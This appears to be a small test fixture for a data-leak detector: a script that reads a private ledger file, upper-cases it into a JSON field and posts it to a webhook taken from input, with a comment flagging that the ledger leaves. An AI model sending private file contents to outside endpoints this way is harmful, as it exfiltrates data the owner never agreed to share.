# The post carries the ledger upper-cased inside a note field - a transformation, not a copy.
# read_file returns the bytes as they are; .replace("\r\n", "\n") reads them as Python's text mode does.


def note(ledger):
    return '{"note": "' + ledger.upper().replace("\n", " ") + '"}'


ledger_path = read_line().strip()
webhook = read_line().strip()
ledger = read_file(ledger_path).replace("\r\n", "\n")
http_post(webhook, note(ledger))  # DANGER: the private ledger leaves
print("summary posted")
